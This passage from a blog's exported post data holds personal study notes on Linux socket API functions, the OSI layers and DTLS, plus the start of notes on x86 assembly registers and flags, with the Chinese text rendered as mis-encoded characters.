domainï¼šé€šä¿¡åŸŸï¼Œåè®®æ—</span><br><span class="line">      AF_UNIX æœ¬åœ°é€šä¿¡</span><br><span class="line">      AF_INET ipv4ç½‘ç»œåè®®</span><br><span class="line">      AF_INET6 ipv6ç½‘ç»œåè®®</span><br><span class="line">      AF_PACKET åº•å±‚æ¥å£</span><br><span class="line">    typeï¼šå¥—æ¥å­—çš„ç±»å‹</span><br><span class="line">      SOCK_STREAM æµå¼å¥—æ¥å­—ï¼ˆtcpï¼‰</span><br><span class="line">      SOCK_DGRAM æ•°æ®æŠ¥å¥—æ¥å­—ï¼ˆudpï¼‰</span><br><span class="line">      SOCK_RAW åŸå§‹å¥—æ¥å­—ï¼ˆç”¨äºé“¾è·¯å±‚ï¼‰</span><br><span class="line">    protocolï¼šé™„åŠ åè®®ï¼Œå¦‚æœä¸éœ€è¦ï¼Œåˆ™è®¾ç½®ä¸º<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼šæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">    å¤±è´¥ï¼šâ€<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="2-ç»‘å®šå¥—æ¥å­—bind"><a href="#2-ç»‘å®šå¥—æ¥å­—bind" class="headerlink" title="2.ç»‘å®šå¥—æ¥å­—bind()"></a>2.ç»‘å®šå¥—æ¥å­—bind()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"> </span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    å°†å¥—æ¥å­—ä¸ç½‘ç»œä¿¡æ¯ç»“æ„ä½“ç»‘å®š</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼Œsocketçš„è¿”å›å€¼</span><br><span class="line">    addrï¼šç½‘ç»œä¿¡æ¯ç»“æ„ä½“</span><br><span class="line">      é€šç”¨ç»“æ„ä½“ï¼ˆä¸€èˆ¬ä¸ç”¨ï¼‰</span><br><span class="line">      struct sockaddr</span><br><span class="line">      ç½‘ç»œä¿¡æ¯ç»“æ„ä½“ sockaddr_in</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">struct sockaddr_in</span><br><span class="line">addrlenï¼š</span><br><span class="line">    addrçš„é•¿åº¦</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼š0</span><br><span class="line">    å¤±è´¥ï¼š-1</span><br></pre></td></tr></table></figure><h5 id="3-ç›‘å¬å¥—æ¥å­—listen"><a href="#3-ç›‘å¬å¥—æ¥å­—listen" class="headerlink" title="3.ç›‘å¬å¥—æ¥å­—listen()"></a>3.ç›‘å¬å¥—æ¥å­—listen()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> <span class="comment">/* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span>;</span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    å°†å¥—æ¥å­—è®¾ç½®ä¸ºè¢«åŠ¨ç›‘å¬çŠ¶æ€ï¼Œè¿™æ ·åšä¹‹åå°±å¯ä»¥æ¥æ”¶åˆ°è¿æ¥è¯·æ±‚</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼Œsocketå‡½æ•°è¿”å›å€¼</span><br><span class="line">    backlogï¼šå…è®¸é€šä¿¡è¿æ¥çš„ä¸»æœºä¸ªæ•°ï¼Œä¸€èˆ¬è®¾ç½®ä¸º<span class="number">5</span>ã€<span class="number">10</span></span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">    å¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><h5 id="4-æ¥æ”¶è¿æ¥accept"><a href="#4-æ¥æ”¶è¿æ¥accept" class="headerlink" title="4.æ¥æ”¶è¿æ¥accept()"></a>4.æ¥æ”¶è¿æ¥accept()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> <span class="comment">/* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">accept</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    é˜»å¡ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼Œsocketå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">    addrï¼šæ¥æ”¶åˆ°çš„å®¢æˆ·ç«¯çš„ä¿¡æ¯ç»“æ„ä½“ï¼ˆè‡ªåŠ¨å¡«å……ï¼Œå®šä¹‰å˜é‡å³å¯ï¼‰</span><br><span class="line">    addrlenï¼šaddrçš„é•¿åº¦</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼šæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆåªè¦æœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œå°±ä¼šäº§ç”Ÿæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ä¸“é—¨ä¸æŒ‡å®šçš„å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡çš„ï¼‰</span><br><span class="line">    å¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><h5 id="5-é€šä¿¡recv-send"><a href="#5-é€šä¿¡recv-send" class="headerlink" title="5.é€šä¿¡recv()/send()"></a>5.é€šä¿¡recv()/send()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">recv</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    æ¥æ”¶æ•°æ®</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">å®¢æˆ·ç«¯ï¼šsocketå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">æœåŠ¡å™¨ï¼šacceptå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">    bufï¼šä¿å­˜æ¥æ”¶åˆ°çš„æ•°æ®</span><br><span class="line">    lenï¼šbufçš„é•¿åº¦</span><br><span class="line">    flagsï¼šæ ‡å¿—ä½</span><br><span class="line">      <span class="number">0</span> é˜»å¡</span><br><span class="line">      MSG_DONTWAIT éé˜»å¡</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼šæ¥æ”¶çš„å­—èŠ‚æ•°</span><br><span class="line">    å¤±è´¥ï¼š<span class="number">-1</span></span><br><span class="line">å¦‚æœå‘é€ç«¯å…³é—­æ–‡ä»¶æè¿°ç¬¦æˆ–è€…å…³é—­è¿›ç¨‹ï¼Œåˆ™recvå‡½æ•°ä¼šè¿”å›<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">send</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br><span class="line"> </span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    å‘é€æ•°æ®</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line"> </span><br><span class="line">å®¢æˆ·ç«¯ï¼š</span><br><span class="line">    socketå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">æœåŠ¡å™¨ï¼š</span><br><span class="line">    acceptå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line"> </span><br><span class="line">     bufï¼šå‘é€çš„æ•°æ®</span><br><span class="line">     lenï¼šbufçš„é•¿åº¦</span><br><span class="line">     flagsï¼šæ ‡å¿—ä½</span><br><span class="line">       <span class="number">0</span> é˜»å¡</span><br><span class="line">       MSG_DONTWAIT éé˜»å¡</span><br><span class="line"> </span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼šå‘é€çš„å­—èŠ‚æ•°</span><br><span class="line">    å¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><h5 id="6-å…³é—­å¥—æ¥å­—"><a href="#6-å…³é—­å¥—æ¥å­—" class="headerlink" title="6.å…³é—­å¥—æ¥å­—()"></a>6.å…³é—­å¥—æ¥å­—()</h5><h4 id="clientç«¯"><a href="#clientç«¯" class="headerlink" title="clientç«¯"></a>clientç«¯</h4><h5 id="1-socket"><a href="#1-socket" class="headerlink" title="1.socket()"></a>1.socket()</h5><h5 id="2-connect"><a href="#2-connect" class="headerlink" title="2.connect()"></a>2.connect()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> <span class="comment">/* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span>;</span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    ç»™æœåŠ¡å™¨å‘é€å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    sockfdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼Œsocketå‡½æ•°çš„è¿”å›å€¼</span><br><span class="line">    addrï¼šè¦è¿æ¥çš„æœåŠ¡å™¨çš„ç½‘ç»œä¿¡æ¯ç»“æ„ä½“ï¼ˆéœ€è¦è‡ªå·±è®¾ç½®ï¼‰</span><br><span class="line">    addrlenï¼šaddçš„é•¿åº¦</span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">    æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">    å¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><h5 id="3-send-recv"><a href="#3-send-recv" class="headerlink" title="3.send()/recv()"></a>3.send()/recv()</h5><h5 id="4-close"><a href="#4-close" class="headerlink" title="4.close()"></a>4.close()</h5><h3 id="ä¸‰ã€OSIæ¨¡å‹"><a href="#ä¸‰ã€OSIæ¨¡å‹" class="headerlink" title="ä¸‰ã€OSIæ¨¡å‹"></a>ä¸‰ã€OSIæ¨¡å‹</h3><div class="table-container"><table><thead><tr><th>åº”ç”¨å±‚</th><th>HTTPã€SMTPã€SNMPã€FTPã€Telnetã€SIPã€SSHã€NFSã€RTSPã€XMPPã€Whoisã€ENRPã€ç­‰ç­‰</th></tr></thead><tbody><tr><td>è¡¨ç¤ºå±‚</td><td>XDRã€ASN.1ã€SMBã€AFPã€NCPã€ç­‰ç­‰</td></tr><tr><td>ä¼šè¯å±‚</td><td>ASAPã€SSHã€RPCã€NetBIOSã€ASPã€Winsockã€BSD Socketsã€ç­‰ç­‰</td></tr><tr><td>ä¼ è¾“å±‚</td><td>TCPã€UDPã€TLSã€RTPã€SCTPã€SPXã€ATPã€ILã€ç­‰ç­‰</td></tr><tr><td>ç½‘ç»œå±‚</td><td>IPã€ICMPã€IGMPã€IPXã€BGPã€OSPFã€RIPã€IGRPã€EIGRPã€ARPã€RARPã€X.25ã€ç­‰ç­‰</td></tr><tr><td>æ•°æ®é“¾è·¯å±‚</td><td>ä»¥å¤ªç½‘ã€ä»¤ç‰Œç¯ã€HDLCã€å¸§ä¸­ç»§ã€ISDNã€ATMã€IEEE 802.11ã€FDDIã€PPPã€ç­‰ç­‰</td></tr><tr><td>ç‰©ç†å±‚</td><td>ä¾‹å¦‚é“œç¼†ã€ç½‘çº¿ã€å…‰ç¼†ã€æ— çº¿ç”µç­‰ç­‰</td></tr></tbody></table></div><p><img src="C:\Users\zmycm\AppData\Roaming\Typora\typora-user-images\image-20241124204619077.png" alt="image-20241124204619077"></p><h2 id="DTLS"><a href="#DTLS" class="headerlink" title="DTLS"></a>DTLS</h2><h3 id="1-1DTLSç‰¹ç‚¹ä½œç”¨"><a href="#1-1DTLSç‰¹ç‚¹ä½œç”¨" class="headerlink" title="1.1DTLSç‰¹ç‚¹ä½œç”¨"></a>1.1DTLSç‰¹ç‚¹ä½œç”¨</h3><p><strong>DTLS</strong>: æ˜¯ä¸€ç§é¢å‘<strong>æ— è¿æ¥</strong>çš„åè®®ï¼Œ<strong>åŸºäº UDP</strong>ï¼Œ<strong>ä½œç”¨</strong>ä¸ºç»™UDPæä¾›ç«¯åˆ°ç«¯çš„å®‰å…¨é€šé“ï¼Œå°±åƒSSL/TLSå¯¹TCPçš„ä½œç”¨ä¸€æ ·ã€‚</p><p>SSL/TLSåè®®æ˜¯åŸºäºTCP socketï¼Œåˆ©ç”¨åŠ å¯†ã€åŸºäºæ•°å­—è¯ä¹¦çš„èº«ä»½éªŒè¯ç­‰æœºåˆ¶åœ¨ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ä¹‹é—´æ„å»ºäº†ä¸€ä¸ªç«¯åˆ°ç«¯çš„å®‰å…¨é€šé“ï¼Œä¿è¯äº†ä¼ è¾“æ•°æ®çš„åŠ å¯†æ€§ã€‚</p><p>æ²¡ç”¨åˆ°ï¼Œç”¨åˆ°å†æ¥è¡¥å……</p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> ç½‘ç»œåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X86æ±‡ç¼–&amp;å†…è”æ±‡ç¼–</title>
      <link href="/2024/12/27/X86%E6%B1%87%E7%BC%96and%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
      <url>/2024/12/27/X86%E6%B1%87%E7%BC%96and%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€åŸºç¡€çŸ¥è¯†"><a href="#ä¸€ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="ä¸€ã€åŸºç¡€çŸ¥è¯†"></a>ä¸€ã€åŸºç¡€çŸ¥è¯†</h1><h2 id="1-CPU"><a href="#1-CPU" class="headerlink" title="1.CPU"></a>1.CPU</h2><p>CPUæ§åˆ¶æ•´ä¸ªè®¡ç®—æœºè¿ä½œå’Œè¿ç®—ã€‚è¦æƒ³è®©CPUå·¥ä½œï¼Œå°±éœ€è¦å‘å®ƒæä¾›<strong>æŒ‡ä»¤</strong>å’Œ<strong>æ•°æ®</strong>ã€‚</p><h2 id="2-æŒ‡ä»¤"><a href="#2-æŒ‡ä»¤" class="headerlink" title="2.æŒ‡ä»¤"></a>2.æŒ‡ä»¤</h2><h3 id="ï¼ˆ1ï¼‰-æ±‡ç¼–æŒ‡ä»¤"><a href="#ï¼ˆ1ï¼‰-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="ï¼ˆ1ï¼‰.æ±‡ç¼–æŒ‡ä»¤"></a>ï¼ˆ1ï¼‰.æ±‡ç¼–æŒ‡ä»¤</h3><p>ç›´æ¥è¢«CPUæ‰§è¡Œçš„æŒ‡ä»¤</p><h3 id="ï¼ˆ2ï¼‰-ä¼ªæŒ‡ä»¤"><a href="#ï¼ˆ2ï¼‰-ä¼ªæŒ‡ä»¤" class="headerlink" title="ï¼ˆ2ï¼‰.ä¼ªæŒ‡ä»¤"></a>ï¼ˆ2ï¼‰.ä¼ªæŒ‡ä»¤</h3><p>æŒ‡å¯¼æ±‡ç¼–å™¨å·¥ä½œçš„æŒ‡ä»¤ï¼Œä¸ç”Ÿæˆæœºæ¢°ç ã€‚</p><ul><li>æ®µå®šä¹‰æŒ‡ä»¤ï¼šå¦‚SEGMENTã€ENDSï¼Œç”¨äºå®šä¹‰å’Œç»“æŸä¸€ä¸ªæ®µã€‚</li><li>æ•°æ®å®šä¹‰æŒ‡ä»¤ï¼šå¦‚DBã€DWï¼Œç”¨äºå®šä¹‰å­—èŠ‚æˆ–å­—æ•°æ®ã€‚</li><li>å¸¸é‡å®šä¹‰æŒ‡ä»¤ï¼šå¦‚EQUï¼Œç”¨äºå®šä¹‰å¸¸é‡ã€‚</li></ul><h2 id="3-ç¬¦å·æŒ‡ä»¤"><a href="#3-ç¬¦å·æŒ‡ä»¤" class="headerlink" title="(3).ç¬¦å·æŒ‡ä»¤"></a>(3).ç¬¦å·æŒ‡ä»¤</h2><p>ç”¨äºæ ‡è¯†å˜é‡ã€å¸¸é‡ã€ä»£ç æ®µç­‰ï¼Œåœ¨æ±‡ç¼–è¿‡ç¨‹ä¸­è¢«æ›¿æ¢ä¸ºå…·ä½“çš„åœ°å€æˆ–å€¼ã€‚å®ƒä»¬æ²¡æœ‰å¯¹åº”çš„æœºå™¨ç ã€‚</p><ul><li><p><strong>æ ‡ç­¾</strong>ï¼šç”¨äºæ ‡è¯†ä»£ç ä¸­çš„ä½ç½®ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">LABEL</span>: ; å®šä¹‰ä¸€ä¸ªæ ‡ç­¾<span class="selector-tag">LABEL</span></span><br></pre></td></tr></table></figure></li><li><p><strong>å®å®šä¹‰</strong>ï¼šå¦‚<code>MACRO</code>ï¼Œç”¨äºå®šä¹‰å®ï¼Œç®€åŒ–ä»£ç ç¼–å†™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MYMACRO MACRO ; å®å®šä¹‰å†…å®¹ ENDM</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"><a href="#3-CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™" class="headerlink" title="3.CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™"></a>3.CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™</h3><ol><li>å­˜å‚¨å•å…ƒçš„åœ°å€</li><li>æ§åˆ¶ä¿¡æ¯</li><li>è¯»æˆ–è€…å†™çš„æ•°æ®</li></ol><h2 id="4-åœ°å€æ€»çº¿"><a href="#4-åœ°å€æ€»çº¿" class="headerlink" title="4.åœ°å€æ€»çº¿"></a>4.åœ°å€æ€»çº¿</h2><p>CPUé€šè¿‡åœ°å€æ€»çº¿æ¥<strong>æŒ‡å®šå­˜å‚¨å™¨å•å…ƒ</strong>ã€‚</p><p>ä¸€ä¸ªCPUæœ‰Næ ¹åœ°å€çº¿ï¼Œåˆ™å®ƒçš„åœ°å€æ€»çº¿å®½åº¦ä¸ºNï¼Œæœ€å¤šå¯ä»¥å¯»æ‰¾2çš„Næ¬¡æ–¹ç»™å†…å­˜å•å…ƒã€‚</p><p>CPUé€šè¿‡åœ°å€æ€»çº¿ä¼ å…¥å­˜å‚¨å™¨çš„å¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒçš„<strong>ç‰©ç†åœ°å€</strong>ã€‚</p><h2 id="5-æ•°æ®æ€»çº¿"><a href="#5-æ•°æ®æ€»çº¿" class="headerlink" title="5.æ•°æ®æ€»çº¿"></a>5.æ•°æ®æ€»çº¿</h2><p>CPUä¸å†…å­˜æˆ–å…¶ä»–å™¨ä»¶ä¹‹é—´<strong>æ•°æ®ä¼ é€</strong>æ˜¯é€šè¿‡æ•°æ®æ€»çº¿è¿›è¡Œçš„ã€‚</p><h2 id="6-æ§åˆ¶æ€»çº¿"><a href="#6-æ§åˆ¶æ€»çº¿" class="headerlink" title="6.æ§åˆ¶æ€»çº¿"></a>6.æ§åˆ¶æ€»çº¿</h2><p>CPU<strong>å¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶</strong>æ˜¯é€šè¿‡æ§åˆ¶æ€»çº¿è¿›è¡Œçš„ã€‚</p><h2 id="7-å†…å­˜åœ°å€ç©ºé—´"><a href="#7-å†…å­˜åœ°å€ç©ºé—´" class="headerlink" title="7.å†…å­˜åœ°å€ç©ºé—´"></a>7.å†…å­˜åœ°å€ç©ºé—´</h2><p>8086CPUåœ°å€æ€»çº¿å®½åº¦ä¸º20ï¼Œå¯ä»¥å®šä½2çš„20æ¬¡æ–¹ä¸ªå†…å­˜å•å…ƒï¼Œé‚£ä¹ˆå†…å­˜åœ°å€ç©ºé—´ä¸º1MBã€‚</p><h1 id="äºŒã€å¯„å­˜å™¨"><a href="#äºŒã€å¯„å­˜å™¨" class="headerlink" title="äºŒã€å¯„å­˜å™¨"></a>äºŒã€å¯„å­˜å™¨</h1><h2 id="ï¼ˆä¸€ï¼‰ã€é€šç”¨å¯„å­˜å™¨"><a href="#ï¼ˆä¸€ï¼‰ã€é€šç”¨å¯„å­˜å™¨" class="headerlink" title="ï¼ˆä¸€ï¼‰ã€é€šç”¨å¯„å­˜å™¨"></a>ï¼ˆä¸€ï¼‰ã€é€šç”¨å¯„å­˜å™¨</h2><h3 id="1-æ•°æ®å¯„å­˜å™¨"><a href="#1-æ•°æ®å¯„å­˜å™¨" class="headerlink" title="1.æ•°æ®å¯„å­˜å™¨"></a>1.æ•°æ®å¯„å­˜å™¨</h3><p><strong>ï¼ˆ1ï¼‰ä½œä¸ºå®Œæ•´çš„32ä½æ•°æ®å¯„å­˜å™¨</strong></p><ul><li>EAXï¼ŒEBXï¼ŒECXï¼ŒEDX</li></ul><p><strong>ï¼ˆ2ï¼‰ä¸‹åŠéƒ¨åˆ†ä½œä¸º16ä½å¯„å­˜å™¨</strong></p><ul><li>AXï¼šç´¯åŠ å™¨</li><li>BXï¼šåŸºå€å¯„å­˜å™¨</li><li>CXï¼šè®¡æ•°å¯„å­˜å™¨</li><li>DXï¼šæ•°æ®å¯„å­˜å™¨</li></ul><p><strong>ï¼ˆ3ï¼‰16ä½å¯„å­˜å™¨çš„ä¸‹åŠéƒ¨åˆ†å’Œä¸ŠåŠéƒ¨åˆ†å†ä½œä¸º8ä½å¯„å­˜å™¨</strong></p><ul><li>AH,AL,BLH,BL</li><li>CH,CL,DH,DL</li></ul><h3 id="2-æŒ‡é’ˆå¯„å­˜å™¨"><a href="#2-æŒ‡é’ˆå¯„å­˜å™¨" class="headerlink" title="2.æŒ‡é’ˆå¯„å­˜å™¨"></a>2.æŒ‡é’ˆå¯„å­˜å™¨</h3><ul><li>æŒ‡ä»¤æŒ‡é’ˆï¼ˆIPï¼‰</li><li>å †æ ˆæŒ‡é’ˆï¼ˆSPï¼‰</li><li>åŸºæœ¬æŒ‡é’ˆï¼ˆBPï¼‰</li></ul><h3 id="3-ç´¢å¼•å¯„å­˜å™¨"><a href="#3-ç´¢å¼•å¯„å­˜å™¨" class="headerlink" title="3.ç´¢å¼•å¯„å­˜å™¨"></a>3.ç´¢å¼•å¯„å­˜å™¨</h3><ul><li>æºç´¢å¼•ï¼ˆSIï¼‰</li><li>DI</li></ul><h3 id="4-æ•°æ®å¯„å­˜å™¨"><a href="#4-æ•°æ®å¯„å­˜å™¨" class="headerlink" title="4.æ•°æ®å¯„å­˜å™¨"></a>4.æ•°æ®å¯„å­˜å™¨</h3><h2 id="ï¼ˆäºŒï¼‰ã€æ§åˆ¶å¯„å­˜å™¨"><a href="#ï¼ˆäºŒï¼‰ã€æ§åˆ¶å¯„å­˜å™¨" class="headerlink" title="ï¼ˆäºŒï¼‰ã€æ§åˆ¶å¯„å­˜å™¨"></a>ï¼ˆäºŒï¼‰ã€æ§åˆ¶å¯„å­˜å™¨</h2><p>å°†32ä½æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨å’Œ32ä½æ ‡å¿—å¯„å­˜å™¨ç»„åˆã€‚</p><h3 id="é€šç”¨æ ‡å¿—ä½"><a href="#é€šç”¨æ ‡å¿—ä½" class="headerlink" title="é€šç”¨æ ‡å¿—ä½"></a>é€šç”¨æ ‡å¿—ä½</h3><ul><li><strong>æº¢å‡ºæ ‡å¿—ï¼ˆOFï¼‰</strong> -<u>æœ‰ç¬¦å·</u>ç®—æœ¯è¿ç®—åæ•°æ®çš„é«˜é˜¶ä½ï¼ˆæœ€å·¦ä½ï¼‰çš„æº¢å‡ºã€‚</li><li><strong>æ–¹å‘æ ‡è®°ï¼ˆDFï¼‰</strong> -DFå€¼ä¸º0æ—¶ï¼Œå­—ç¬¦ä¸²æ“ä½œä¸ºä»å·¦è‡³å³çš„æ–¹å‘ï¼›å½“DFå€¼ä¸º1æ—¶ï¼Œå­—ç¬¦ä¸²æ“ä½œä¸ºä»å³è‡³å·¦çš„æ–¹å‘ã€‚</li><li><strong>ä¸­æ–­æ ‡å¿—ï¼ˆIFï¼‰</strong> -å½“å€¼ä¸º0æ—¶ï¼Œå®ƒç¦ç”¨å¤–éƒ¨ä¸­æ–­ï¼Œè€Œå½“å€¼ä¸º1æ—¶ï¼Œå®ƒä½¿èƒ½ä¸­æ–­ã€‚</li><li><strong>é™·é˜±æ ‡å¿—ï¼ˆTFï¼‰</strong> -å…è®¸åœ¨å•æ­¥æ¨¡å¼ä¸‹è®¾ç½®å¤„ç†å™¨çš„æ“ä½œã€‚æˆ‘ä»¬ä½¿ç”¨çš„DEBUGç¨‹åºè®¾ç½®äº†é™·é˜±æ ‡å¿—ï¼Œå› 